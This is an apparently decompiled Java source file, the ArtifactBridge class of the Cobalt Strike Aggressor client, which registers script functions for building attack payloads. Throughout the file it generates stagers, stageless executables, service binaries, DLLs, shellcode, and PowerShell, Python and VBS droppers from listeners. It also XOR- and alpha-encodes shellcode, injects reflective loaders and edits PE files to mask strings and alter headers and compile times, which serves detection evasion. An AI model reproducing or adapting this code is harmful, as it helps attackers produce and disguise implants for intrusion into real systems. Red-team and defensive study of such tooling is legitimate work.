package aggressor.bridges;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import aggressor.TeamServerProps;
import common.ArtifactUtils;
import common.Callback;
import common.CommonUtils;
import common.DevLog;
import common.License;
import common.ListenerUtils;
import common.MutantResourceUtils;
import common.PowerShellUtils;
import common.ReflectiveDLL;
import common.ReflectiveLoaderInfo;
import common.ResourceUtils;
import common.ScListener;
import cortana.Cortana;
import encoders.Transforms;
import java.util.Map;
import java.util.Stack;
import pe.BeaconLoader;
import pe.OBJExecutable;
import pe.OBJExecutableSimple;
import pe.PEEditor;
import pe.PEParser;
import sleep.bridges.BridgeUtilities;
import sleep.bridges.SleepClosure;
import sleep.interfaces.Function;
import sleep.interfaces.Loadable;
import sleep.interfaces.Predicate;
import sleep.runtime.Scalar;
import sleep.runtime.ScriptInstance;
import sleep.runtime.SleepUtils;

public class ArtifactBridge implements Function, Loadable, Predicate {
   protected AggressorClient client;

   public ArtifactBridge(AggressorClient var1) {
      this.client = var1;
   }

   public void scriptLoaded(ScriptInstance var1) {
      Cortana.put(var1, "&artifact_sign", this);
      Cortana.put(var1, "&transform", this);
      Cortana.put(var1, "&transform_vbs", this);
      Cortana.put(var1, "&encode", this);
      Cortana.put(var1, "&str_chunk", this);
      Cortana.put(var1, "&artifact_payload", this);
      Cortana.put(var1, "&artifact_stager", this);
      Cortana.put(var1, "&artifact_general", this);
      Cortana.put(var1, "&payload", this);
      Cortana.put(var1, "&payload_local", this);
      Cortana.put(var1, "&stager", this);
      Cortana.put(var1, "&stager_bind_tcp", this);
      Cortana.put(var1, "&stager_bind_pipe", this);
      DevLog.log(DevLog.STORY.CS0217, this.getClass(), "scriptLoaded", "define reflective loader methods");
      Cortana.put(var1, "&extract_reflective_loader", this);
      Cortana.put(var1, "&setup_reflective_loader", this);
      DevLog.log(DevLog.STORY.CS0218, this.getClass(), "scriptLoaded", "define dll support APIs");
      Cortana.put(var1, "&pedump", this);
      Cortana.put(var1, "&pe_mask", this);
      Cortana.put(var1, "&pe_mask_section", this);
      Cortana.put(var1, "&pe_mask_string", this);
      Cortana.put(var1, "&pe_patch_code", this);
      Cortana.put(var1, "&pe_set_string", this);
      Cortana.put(var1, "&pe_set_stringz", this);
      Cortana.put(var1, "&pe_set_long", this);
      Cortana.put(var1, "&pe_set_short", this);
      Cortana.put(var1, "&pe_set_value_at", this);
      Cortana.put(var1, "&pe_stomp", this);
      Cortana.put(var1, "&pe_insert_rich_header", this);
      Cortana.put(var1, "&pe_remove_rich_header", this);
      Cortana.put(var1, "&pe_set_export_name", this);
      Cortana.put(var1, "&pe_set_checksum", this);
      Cortana.put(var1, "&pe_update_checksum", this);
      Cortana.put(var1, "&pe_set_compile_time_with_long", this);
      Cortana.put(var1, "&pe_set_compile_time_with_string", this);
      Cortana.put(var1, "&bof_extract", this);
      Cortana.put(var1, "&payload_bootstrap_hint", this);
      Cortana.put(var1, "&artifact", this);
      Cortana.put(var1, "&artifact_stageless", this);
      Cortana.put(var1, "&shellcode", this);
      Cortana.put(var1, "&powershell", this);
      var1.getScriptEnvironment().getEnvironment().put("-hasbootstraphint", this);
   }

   public boolean decide(String var1, ScriptInstance var2, Stack var3) {
      byte[] var4 = CommonUtils.toBytes(BridgeUtilities.getString(var3, ""));
      if ("-hasbootstraphint".equals(var1)) {
         if (!DataUtils.getProfile(this.client.getData()).option(".stage.smartinject")) {
            return false;
         } else {
            return BeaconLoader.hasLoaderHintX(var4, "x86") || BeaconLoader.hasLoaderHintX(var4, "x64");
         }
      } else {
         return false;
      }
   }

   public void scriptUnloaded(ScriptInstance var1) {
   }

   public byte[] toArtifact(byte[] var1, String var2, String var3) {
      byte[] var4 = new byte[0];
      if ("x64".equals(var2)) {
         if ("exe".equals(var3)) {
            var4 = (new ArtifactUtils(this.client)).patchArtifact(var1, "artifact64.exe");
         } else if ("svcexe".equals(var3)) {
            var4 = (new ArtifactUtils(this.client)).patchArtifact(var1, "artifact64svc.exe");
         } else if ("dll".equals(var3)) {
            var4 = (new ArtifactUtils(this.client)).patchArtifact(var1, "artifact64.x64.dll");
         } else if ("dllx64".equals(var3)) {
            var4 = (new ArtifactUtils(this.client)).patchArtifact(var1, "artifact64.x64.dll");
         } else if ("powershell".equals(var3)) {
            var4 = (new ResourceUtils(this.client)).buildPowerShell(var1, true);
         } else if ("python".equals(var3)) {
            var4 = (new ResourceUtils(this.client)).buildPython(new byte[0], var1);
         } else if ("raw".equals(var3)) {
            var4 = var1;
         } else if ("vbscript".equals(var3)) {
            throw new RuntimeException("The VBS output is only compatible with x86 stagers (for now)");
         }
      } else {
         if (!"x86".equals(var2)) {
            throw new RuntimeException("Invalid arch valid '" + var2 + "'");
         }

         if ("exe".equals(var3)) {
            var4 = (new ArtifactUtils(this.client)).patchArtifact(var1, "artifact32.exe");
         } else if ("svcexe".equals(var3)) {
            var4 = (new ArtifactUtils(this.client)).patchArtifact(var1, "artifact32svc.exe");
         } else if ("dll".equals(var3)) {
            var4 = (new ArtifactUtils(this.client)).patchArtifact(var1, "artifact32.dll");
         } else {
            if ("dllx64".equals(var3)) {
               throw new RuntimeException("Can not generate an x64 dll for an x86 stager. Try dll");
            }

            if ("powershell".equals(var3)) {
               var4 = (new ResourceUtils(this.client)).buildPowerShell(var1, false);
            } else if ("python".equals(var3)) {
               var4 = (new ResourceUtils(this.client)).buildPython(var1, new byte[0]);
            } else if ("raw".equals(var3)) {
               var4 = var1;
            } else {
               if (!"vbscript".equals(var3)) {
                  throw new RuntimeException("Unrecognized artifact type: '" + var3 + "'");
               }

               var4 = (new MutantResourceUtils(this.client)).buildVBS(var1);
            }
         }
      }

      return var4;
   }

   public byte[] toStagelessArtifact(byte[] var1, String var2, String var3) {
      byte[] var4 = new byte[0];
      if ("x64".equals(var2)) {
         if (var3.equals("exe")) {
            var4 = (new ArtifactUtils(this.client)).patchArtifact(var1, "artifact64big.exe");
         } else if (var3.equals("svcexe")) {
            var4 = (new ArtifactUtils(this.client)).patchArtifact(var1, "artifact64svcbig.exe");
         } else if (var3.equals("dll")) {
            var4 = (new ArtifactUtils(this.client)).patchArtifact(var1, "artifact64big.x64.dll");
         } else if (var3.equals("dllx64")) {
            var4 = (new ArtifactUtils(this.client)).patchArtifact(var1, "artifact64big.x64.dll");
         } else if (var3.equals("powershell")) {
            var4 = (new ResourceUtils(this.client)).buildPowerShell(var1, true);
         } else if (var3.equals("python")) {
            var4 = (new ResourceUtils(this.client)).buildPython(new byte[0], var1);
         } else {
            if (!var3.equals("raw")) {
               throw new RuntimeException("Unrecognized artifact type: '" + var3 + "'");
            }

            var4 = var1;
         }
      } else {
         if (!"x86".equals(var2)) {
            throw new RuntimeException("Invalid arch valid '" + var2 + "'");
         }

         if (var3.equals("exe")) {
            var4 = (new ArtifactUtils(this.client)).patchArtifact(var1, "artifact32big.exe");
         } else if (var3.equals("svcexe")) {
            var4 = (new ArtifactUtils(this.client)).patchArtifact(var1, "artifact32svcbig.exe");
         } else if (var3.equals("dll")) {
            var4 = (new ArtifactUtils(this.client)).patchArtifact(var1, "artifact32big.dll");
         } else {
            if (var3.equals("dllx64")) {
               throw new RuntimeException("Can't generate x64 DLL for x86 payload stage.");
            }

            if (var3.equals("powershell")) {
               var4 = (new ResourceUtils(this.client)).buildPowerShell(var1);
            } else if (var3.equals("python")) {
               var4 = (new ResourceUtils(this.client)).buildPython(var1, new byte[0]);
            } else {
               if (!var3.equals("raw")) {
                  throw new RuntimeException("Unrecognized artifact type: '" + var3 + "'");
               }

               var4 = var1;
            }
         }
      }

      return var4;
   }

   public Scalar evaluate(String var1, ScriptInstance var2, Stack var3) {
      byte[] var4;
      if ("&artifact_sign".equals(var1)) {
         var4 = CommonUtils.toBytes(BridgeUtilities.getString(var3, ""));
         return SleepUtils.getScalar(DataUtils.getSigner(this.client.getData()).sign(var4));
      } else {
         final String var5;
         final String var18;
         final String var26;
         final String var32;
         if ("&artifact_stageless".equals(var1)) {
            var18 = BridgeUtilities.getString(var3, "");
            var5 = BridgeUtilities.getString(var3, "");
            var26 = BridgeUtilities.getString(var3, "x86");
            var32 = BridgeUtilities.getString(var3, "");
            final SleepClosure var37 = BridgeUtilities.getFunction(var3, var2);
            this.client.getConnection().call("aggressor.ping", CommonUtils.args(var18), new Callback() {
               public void result(String var1, Object var2) {
                  ScListener var3 = ListenerUtils.getListener(ArtifactBridge.this.client, var18);
                  var3.setProxyString(var32);
                  DevLog.log(DevLog.STORY.CS0215_TEST_EXPORT, this.getClass(), "evaluate.result {&artifact_stageless}", "001");
                  byte[] var4 = (byte[])var3.export(ArtifactBridge.this.client, var26);
                  byte[] var5x = ArtifactBridge.this.toStagelessArtifact(var4, var26, var5);
                  Stack var6 = new Stack();
                  var6.push(SleepUtils.getScalar(var5x));
                  SleepUtils.runCode((SleepClosure)var37, "&artifact_stageless", (ScriptInstance)null, var6);
               }
            });
         } else {
            byte[] var8;
            ScListener var30;
            byte[] var34;
            if ("&artifact_payload".equals(var1)) {
               var18 = BridgeUtilities.getString(var3, "");
               var5 = BridgeUtilities.getString(var3, "");
               var26 = BridgeUtilities.getString(var3, "x86");
               var30 = ListenerUtils.getListener(this.client, var18);
               if (var30 == null) {
                  throw new RuntimeException("No listener '" + var18 + "'");
               }

               DevLog.log(DevLog.STORY.CS0215_TEST_EXPORT, this.getClass(), "evaluate {&artifact_payload}", "002");
               var8 = (byte[])var30.export(this.client, var26);
               var34 = this.toStagelessArtifact(var8, var26, var5);
               return SleepUtils.getScalar(var34);
            }

            if ("&artifact_general".equals(var1)) {
               var4 = CommonUtils.toBytes(BridgeUtilities.getString(var3, ""));
               var5 = BridgeUtilities.getString(var3, "");
               var26 = BridgeUtilities.getString(var3, "x86");
               if (var4.length < 1024) {
                  return SleepUtils.getScalar(this.toArtifact(var4, var26, var5));
               }

               return SleepUtils.getScalar(this.toStagelessArtifact(var4, var26, var5));
            }

            if ("&artifact_stager".equals(var1)) {
               var18 = BridgeUtilities.getString(var3, "");
               var5 = BridgeUtilities.getString(var3, "");
               var26 = BridgeUtilities.getString(var3, "x86");
               var30 = ListenerUtils.getListener(this.client, var18);
               if (var30 == null) {
                  throw new RuntimeException("No listener '" + var18 + "'");
               }

               return SleepUtils.getScalar(this.toArtifact(var30.getPayloadStager(var26), var26, var5));
            }

            ScListener var31;
            if ("&stager".equals(var1)) {
               var18 = BridgeUtilities.getString(var3, "");
               var5 = BridgeUtilities.getString(var3, "x86");
               var31 = ListenerUtils.getListener(this.client, var18);
               if (var31 == null) {
                  throw new RuntimeException("No listener '" + var18 + "'");
               }

               return SleepUtils.getScalar(var31.getPayloadStager(var5));
            }

            if ("&stager_bind_tcp".equals(var1)) {
               var18 = BridgeUtilities.getString(var3, "");
               var5 = BridgeUtilities.getString(var3, "x86");
               int var36 = BridgeUtilities.getInt(var3, CommonUtils.randomPort());
               var30 = ListenerUtils.getListener(this.client, var18);
               return SleepUtils.getScalar(var30.getPayloadStagerLocal(var36, "x86"));
            }

            if ("&stager_bind_pipe".equals(var1)) {
               var18 = BridgeUtilities.getString(var3, "");
               var5 = BridgeUtilities.getString(var3, "x86");
               var31 = ListenerUtils.getListener(this.client, var18);
               var32 = var31.getConfig().getStagerPipe();
               if ("x86".equals(var5)) {
                  return SleepUtils.getScalar(var31.getPayloadStagerPipe(var32, "x86"));
               }

               throw new RuntimeException("x86 is the only arch option available with &stager_remote");
            }

            if ("&payload".equals(var1)) {
               var18 = BridgeUtilities.getString(var3, "");
               var5 = BridgeUtilities.getString(var3, "x86");
               var31 = ListenerUtils.getListener(this.client, var18);
               var32 = BridgeUtilities.getString(var3, "process");
               if (var31 == null) {
                  throw new RuntimeException("No listener '" + var18 + "'");
               }

               if ("process".equals(var32)) {
                  DevLog.log(DevLog.STORY.CS0215_TEST_EXPORT, this.getClass(), "evaluate {&payload : process}", "003");
                  return SleepUtils.getScalar(var31.export(this.client, var5));
               }

               if ("thread".equals(var32)) {
                  DevLog.log(DevLog.STORY.CS0215_TEST_EXPORT, this.getClass(), "evaluate {&payload : thread}", "004");
                  return SleepUtils.getScalar(var31.export(this.client, var5, 1));
               }

               throw new RuntimeException("'" + var32 + "' is not a valid exit argument");
            }

            if ("&payload_local".equals(var1)) {
               var18 = BridgeUtilities.getString(var3, "");
               var5 = BridgeUtilities.getString(var3, "");
               var26 = BridgeUtilities.getString(var3, "x86");
               var30 = ListenerUtils.getListener(this.client, var5);
               String var35 = BridgeUtilities.getString(var3, "process");
               if (var30 == null) {
                  throw new RuntimeException("No listener '" + var5 + "'");
               } else if ("process".equals(var35)) {
                  DevLog.log(DevLog.STORY.CS0215_TEST_EXPORTLOCAL, this.getClass(), "evaluate {&payload_local : process}", "001");
                  return SleepUtils.getScalar(var30.exportLocal(this.client, var18, var26));
               } else if ("thread".equals(var35)) {
                  DevLog.log(DevLog.STORY.CS0215_TEST_EXPORTLOCAL, this.getClass(), "evaluate {&payload_local : thread}", "002");
                  return SleepUtils.getScalar(var30.exportLocal(this.client, var18, var26, 1));
               } else {
                  throw new RuntimeException("'" + var35 + "' is not a valid exit argument");
               }
            }

            if ("&artifact".equals(var1)) {
               var18 = BridgeUtilities.getString(var3, "");
               var5 = BridgeUtilities.getString(var3, "");
               Scalar var29 = BridgeUtilities.getScalar(var3);
               var32 = BridgeUtilities.getString(var3, "x86");
               ScListener var33 = ListenerUtils.getListener(this.client, var18);
               return SleepUtils.getScalar(this.toArtifact(var33.getPayloadStager(var32), var32, var5));
            }

            Scalar var27;
            if ("&shellcode".equals(var1)) {
               var18 = BridgeUtilities.getString(var3, "");
               var27 = BridgeUtilities.getScalar(var3);
               var26 = BridgeUtilities.getString(var3, "x86");
               var30 = ListenerUtils.getListener(this.client, var18);
               if ("x64".equals(var26)) {
                  var8 = var30.getPayloadStager("x64");
                  return SleepUtils.getScalar(var8);
               }

               var8 = var30.getPayloadStager("x86");
               return SleepUtils.getScalar(var8);
            }

            if ("&powershell".equals(var1)) {
               var18 = BridgeUtilities.getString(var3, "");
               var27 = BridgeUtilities.getScalar(var3);
               var26 = BridgeUtilities.getString(var3, "x86");
               var30 = ListenerUtils.getListener(this.client, var18);
               if ("x64".equals(var26)) {
                  var8 = var30.getPayloadStager("x64");
                  var34 = (new PowerShellUtils(this.client)).buildPowerShellCommand(var8, true);
                  return SleepUtils.getScalar(CommonUtils.bString(var34));
               }

               var8 = var30.getPayloadStager("x86");
               var34 = (new PowerShellUtils(this.client)).buildPowerShellCommand(var8);
               return SleepUtils.getScalar(CommonUtils.bString(var34));
            }

            if ("&encode".equals(var1)) {
               var4 = CommonUtils.toBytes(BridgeUtilities.getString(var3, ""));
               var5 = BridgeUtilities.getString(var3, "");
               var26 = BridgeUtilities.getString(var3, "x86");
               if (License.isTrial()) {
                  return SleepUtils.getScalar(var4);
               }

               if ("xor".equals(var5)) {
                  return SleepUtils.getScalar(ArtifactUtils._XorEncode(var4, var26));
               }

               if ("alpha".equals(var5) && "x86".equals(var26)) {
                  byte[] var28 = new byte[]{-21, 3, 95, -1, -25, -24, -8, -1, -1, -1};
                  return SleepUtils.getScalar(CommonUtils.join(var28, CommonUtils.toBytes(ArtifactUtils._AlphaEncode(var4))));
               }

               throw new IllegalArgumentException("No encoder '" + var5 + "' for " + var26);
            }

            int var21;
            if ("&str_chunk".equals(var1)) {
               var18 = BridgeUtilities.getString(var3, "");
               var21 = BridgeUtilities.getInt(var3, 100);
               return SleepUtils.getArrayWrapper(ArtifactUtils.toChunk(var18, var21));
            }

            if ("&transform".equals(var1)) {
               var4 = CommonUtils.toBytes(BridgeUtilities.getString(var3, ""));
               var5 = BridgeUtilities.getString(var3, "");
               if ("array".equals(var5)) {
                  return SleepUtils.getScalar(Transforms.toArray(var4));
               }

               if ("escape-hex".equals(var5)) {
                  return SleepUtils.getScalar(Transforms.toVeil(var4));
               }

               if ("hex".equals(var5)) {
                  return SleepUtils.getScalar(ArtifactUtils.toHex(var4));
               }

               if ("powershell-base64".equals(var5)) {
                  return SleepUtils.getScalar(CommonUtils.Base64PowerShell(CommonUtils.bString(var4)));
               }

               if ("vba".equals(var5)) {
                  return SleepUtils.getScalar(Transforms.toVBA(var4));
               }

               if ("vbs".equals(var5)) {
                  return SleepUtils.getScalar(ArtifactUtils.toVBS(var4));
               }

               if ("veil".equals(var5)) {
                  return SleepUtils.getScalar(Transforms.toVeil(var4));
               }

               throw new IllegalArgumentException("Type '" + var5 + "' is unknown");
            }

            if ("&transform_vbs".equals(var1)) {
               var4 = CommonUtils.toBytes(BridgeUtilities.getString(var3, ""));
               var21 = BridgeUtilities.getInt(var3, 8);
               return SleepUtils.getScalar(ArtifactUtils.toVBS(var4, var21));
            }

            if ("&payload_bootstrap_hint".equals(var1)) {
               var4 = CommonUtils.toBytes(BridgeUtilities.getString(var3, ""));
               var5 = BridgeUtilities.getString(var3, "");
               if (!DataUtils.getProfile(this.client.getData()).option(".stage.smartinject")) {
                  throw new RuntimeException(".stage.smartinject in your profile is false. Call -hasbootstraphint to determine if it's profile-appropriate to use these hints.");
               }

               if (BeaconLoader.hasLoaderHintX(var4, "x64")) {
                  return SleepUtils.getScalar(BeaconLoader.getLoaderHint(var4, "x64", var5));
               }

               if (BeaconLoader.hasLoaderHintX(var4, "x86")) {
                  return SleepUtils.getScalar(BeaconLoader.getLoaderHint(var4, "x86", var5));
               }

               throw new RuntimeException("No loader hint in payload blob");
            }

            byte[] var19;
            if ("&extract_reflective_loader".equals(var1)) {
               var18 = "evaluate [&extract_reflective_loader]";
               DevLog.log(DevLog.STORY.CS0217, this.getClass(), var18, "Processing Extract Reflective Loader.");
               var19 = CommonUtils.toBytes(BridgeUtilities.getString(var3, ""));
               DevLog.log(DevLog.STORY.CS0217, this.getClass(), var18, "binBlob Length: " + var19.length);
               OBJExecutableSimple var24 = new OBJExecutableSimple(var19);
               var24.parse();
               var24.processRelocations();
               if (var24.hasErrors()) {
                  throw new RuntimeException("Can't parse rDLL loader file:\n" + var24.getErrors());
               }

               DevLog.log(DevLog.STORY.CS0217, this.getClass(), var18, "Returning extracted reflective loader");
               return SleepUtils.getScalar(var24.getCode());
            }

            if ("&setup_reflective_loader".equals(var1)) {
               var18 = "evaluate [&setup_reflective_loader]";
               DevLog.log(DevLog.STORY.CS0217, this.getClass(), var18, "Processing Setup Reflective Loader.");
               var19 = CommonUtils.toBytes(BridgeUtilities.getString(var3, ""));
               byte[] var23 = CommonUtils.toBytes(BridgeUtilities.getString(var3, ""));
               long var25 = 0L;
               if (DevLog.isEnabled()) {
                  var25 = DevLog.checksumByteArray(var19);
               }

               PEParser var9 = PEParser.load(var19);
               ReflectiveLoaderInfo var10 = ReflectiveDLL.getReflectiveLoaderInfo(var9, var19);
               String var11 = "Updating Reflective Loader at Offset: " + var10.offset + " Real Offset: " + var10.realOffset + " Available Space: " + var10.length + " Loader Length: " + var23.length;
               DevLog.log(DevLog.STORY.CS0541, this.getClass(), var18, var11);
               if (var10.length == 5120) {
                  CommonUtils.print_info("Available space for the reflective loader: 5K");
               } else if (var10.length == 51200) {
                  CommonUtils.print_info("Available space for the reflective loader: 50K");
               } else if (var10.length == 102400) {
                  CommonUtils.print_info("Available space for the reflective loader: 100K");
               } else if (var10.length == 1024000) {
                  CommonUtils.print_info("Available space for the reflective loader: 1000K");
               } else {
                  CommonUtils.print_warn("We found an undefined available reflective loader space: " + var10.length);
               }

               if (var23.length > var10.totalLength) {
                  var11 = "Reflective DLL Content length (" + var23.length + ") exceeds available space (" + var10.totalLength + ").";
                  CommonUtils.print_error(var11);
                  throw new IllegalArgumentException(var11);
               }

               byte[] var12 = new byte[var10.totalLength];

               for(int var13 = 0; var13 < var12.length; ++var13) {
                  var12[var13] = var23[var13 % var23.length];
               }

               ReflectiveDLL.setReflectiveLoader(var9, var19, var12, var10);
               int var14 = ReflectiveDLL.findReflectiveLoader(var9);
               byte[] var38;
               if (var9.is64()) {
                  var38 = BeaconLoader.getDOSHeaderPatchX64(CommonUtils.toBytes("MZAR"), var14);
               } else {
                  var38 = BeaconLoader.getDOSHeaderPatchX86(CommonUtils.toBytes("MZRE"), var14);
               }

               CommonUtils.memcpy(var19, var38, var38.length);
               DevLog.log(DevLog.STORY.CS0217, this.getClass(), var18, "Returning DLL updated with Reflective Loader.");
               if (DevLog.isEnabled()) {
                  long var15 = DevLog.checksumByteArray(var19);
                  DevLog.log(DevLog.STORY.CS0217, this.getClass(), var18, "Original Checksum: " + var25 + " New Checksum: " + var15);
               }

               return SleepUtils.getScalar(var19);
            }

            if ("&pedump".equals(var1)) {
               var18 = "evaluate [&pedump]";
               DevLog.log(DevLog.STORY.CS0218, this.getClass(), var18, "Processing PE Dump.");
               var19 = CommonUtils.toBytes(BridgeUtilities.getString(var3, ""));
               if (DevLog.isEnabled()) {
                  long var20 = DevLog.checksumByteArray(var19);
                  DevLog.log(DevLog.STORY.CS0218, this.getClass(), var18, "DLL Length: " + var19.length + " DLL Checksum: " + var20);
               }

               PEParser var22;
               try {
                  var22 = PEParser.load(var19);
               } catch (Exception var17) {
                  throw new RuntimeException("Error loading dll into parser.", var17);
               }

               Map var7 = PEParser.dumpToDictionary(var22);
               return CommonUtils.convertAll(var7);
            }

            if ("&pe_mask".equals(var1) || "&pe_mask_section".equals(var1) || "&pe_mask_string".equals(var1) || "&pe_patch_code".equals(var1) || "&pe_set_string".equals(var1) || "&pe_set_stringz".equals(var1) || "&pe_set_long".equals(var1) || "&pe_set_short".equals(var1) || "&pe_set_value_at".equals(var1) || "&pe_stomp".equals(var1) || "&pe_insert_rich_header".equals(var1) || "&pe_remove_rich_header".equals(var1) || "&pe_set_export_name".equals(var1) || "&pe_set_checksum".equals(var1) || "&pe_update_checksum".equals(var1) || "&pe_set_compile_time_with_long".equals(var1) || "&pe_set_compile_time_with_string".equals(var1)) {
               return this.A(var1, var3);
            }

            if ("&bof_extract".equals(var1)) {
               var4 = CommonUtils.toBytes(BridgeUtilities.getString(var3, ""));
               var5 = "not_used";
               if (var4 != null && var4.length > 0) {
                  OBJExecutable var6 = new OBJExecutable(var4, var5);
                  var6.parse();
                  if (var6.hasErrors()) {
                     throw new RuntimeException("Can't parse bof file:\n" + var6.getErrors());
                  }

                  return SleepUtils.getScalar(var6.getCode());
               }

               throw new RuntimeException("An empty bof file was passed in");
            }
         }

         return SleepUtils.getEmptyScalar();
      }
   }

   private Scalar A(String var1, Stack var2) {
      String var3 = "peEditFunction [" + var1 + "]";
      DevLog.log(DevLog.STORY.CS0218, this.getClass(), var3, "Processing PE Function.");
      byte[] var4 = CommonUtils.toBytes(BridgeUtilities.getString(var2, ""));
      if (DevLog.isEnabled()) {
         long var5 = DevLog.checksumByteArray(var4);
         DevLog.log(DevLog.STORY.CS0218, this.getClass(), var3, "DLL Length: " + var4.length + " DLL Checksum: " + var5);
      }

      PEEditor var11 = new PEEditor(var4);
      if ("true".equalsIgnoreCase(TeamServerProps.getPropsFile().getString("logging.PEEditor_ArtifactBridge", "false"))) {
         var11.setLogActions(true);
      }

      String var8;
      long var9;
      long var12;
      int var13;
      byte[] var14;
      byte[] var16;
      int var17;
      switch (var1) {
         case "&pe_mask":
            var13 = BridgeUtilities.getInt(var2);
            var17 = BridgeUtilities.getInt(var2);
            byte var10 = (byte)BridgeUtilities.getInt(var2);
            DevLog.log(DevLog.STORY.CS0218, this.getClass(), var3, "> Start=" + var13 + " Length=" + var17 + " MaskKey=" + var10);
            var11.mask(var13, var17, var10);
            break;
         case "&pe_mask_section":
            var8 = BridgeUtilities.getString(var2, "");
            var17 = (byte)BridgeUtilities.getInt(var2);
            DevLog.log(DevLog.STORY.CS0218, this.getClass(), var3, "> SectionName=" + var8 + " MaskKey=" + var17);
            var11.maskSection(var8, (byte)var17);
            break;
         case "&pe_mask_string":
            var13 = BridgeUtilities.getInt(var2);
            var17 = (byte)BridgeUtilities.getInt(var2);
            DevLog.log(DevLog.STORY.CS0218, this.getClass(), var3, "> Location=" + var13 + " MaskKey=" + var17);
            var11.maskString(var13, (byte)var17);
            break;
         case "&pe_patch_code":
            var14 = CommonUtils.toBytes(BridgeUtilities.getString(var2, ""));
            var16 = CommonUtils.toBytes(BridgeUtilities.getString(var2, ""));
            DevLog.log(DevLog.STORY.CS0218, this.getClass(), var3, "> findme=" + CommonUtils.toHexString(var14) + " replaceme=" + CommonUtils.toHexString(var16));
            var11.patchCode(var14, var16);
            break;
         case "&pe_set_string":
            var13 = BridgeUtilities.getInt(var2);
            var16 = CommonUtils.toBytes(BridgeUtilities.getString(var2, ""));
            DevLog.log(DevLog.STORY.CS0218, this.getClass(), var3, "> Offset=" + var13 + " Value=" + CommonUtils.bString(var16));
            var11.setString(var13, var16);
            break;
         case "&pe_set_stringz":
            var13 = BridgeUtilities.getInt(var2);
            String var15 = BridgeUtilities.getString(var2, "");
            DevLog.log(DevLog.STORY.CS0218, this.getClass(), var3, "> Offset=" + var13 + " Value=" + var15);
            var11.setStringZ(var13, var15);
            break;
         case "&pe_set_long":
            var13 = BridgeUtilities.getInt(var2);
            var9 = BridgeUtilities.getLong(var2);
            DevLog.log(DevLog.STORY.CS0218, this.getClass(), var3, "> Offset=" + var13 + " Value=" + var9);
            var11.setLong(var13, var9);
            break;
         case "&pe_set_short":
            var13 = BridgeUtilities.getInt(var2);
            var9 = BridgeUtilities.getLong(var2);
            DevLog.log(DevLog.STORY.CS0218, this.getClass(), var3, "> Offset=" + var13 + " Value=" + var9);
            var11.setShort(var13, var9);
            break;
         case "&pe_set_value_at":
            var8 = BridgeUtilities.getString(var2, "");
            var9 = BridgeUtilities.getLong(var2);
            DevLog.log(DevLog.STORY.CS0218, this.getClass(), var3, "> Name=" + var8 + " Value=" + var9);
            var11.setValueAt(var8, var9);
            break;
         case "&pe_stomp":
            var13 = BridgeUtilities.getInt(var2);
            DevLog.log(DevLog.STORY.CS0218, this.getClass(), var3, "> Location=" + var13);
            var11.stomp(var13);
            break;
         case "&pe_insert_rich_header":
            var14 = CommonUtils.toBytes(BridgeUtilities.getString(var2, ""));
            DevLog.log(DevLog.STORY.CS0218, this.getClass(), var3, " RichHeader=" + CommonUtils.toHexString(var14));
            var11.insertRichHeader(var14);
            break;
         case "&pe_remove_rich_header":
            var13 = BridgeUtilities.getInt(var2);
            DevLog.log(DevLog.STORY.CS0218, this.getClass(), var3, ">");
            var11.removeRichHeader();
            break;
         case "&pe_set_export_name":
            var8 = BridgeUtilities.getString(var2, "");
            DevLog.log(DevLog.STORY.CS0218, this.getClass(), var3, "> ExportName=" + var8);
            var11.setExportName(var8);
            break;
         case "&pe_set_checksum":
            var12 = BridgeUtilities.getLong(var2);
            DevLog.log(DevLog.STORY.CS0218, this.getClass(), var3, "> Checksum=" + var12);
            var11.setChecksum(var12);
            break;
         case "&pe_update_checksum":
            DevLog.log(DevLog.STORY.CS0218, this.getClass(), var3, ">");
            var11.updateChecksum();
            break;
         case "&pe_set_compile_time_with_long":
            var12 = BridgeUtilities.getLong(var2);
            DevLog.log(DevLog.STORY.CS0218, this.getClass(), var3, "> Date[seconds since 1969]=" + var12);
            var11.setCompileTime(var12);
            break;
         case "&pe_set_compile_time_with_string":
            var8 = BridgeUtilities.getString(var2, "");
            DevLog.log(DevLog.STORY.CS0218, this.getClass(), var3, "> Date=" + var8);
            var11.setCompileTime(var8);
            break;
         default:
            CommonUtils.print_warn("Undefined PE edit function name: " + var1);
      }

      byte[] var6 = var11.getImage();
      if (DevLog.isEnabled()) {
         long var18 = DevLog.checksumByteArray(var6);
         DevLog.log(DevLog.STORY.CS0218, this.getClass(), var3, "New DLL Length: " + var6.length + " New DLL Checksum: " + var18);
      }

      return SleepUtils.getScalar(var6);
   }
}
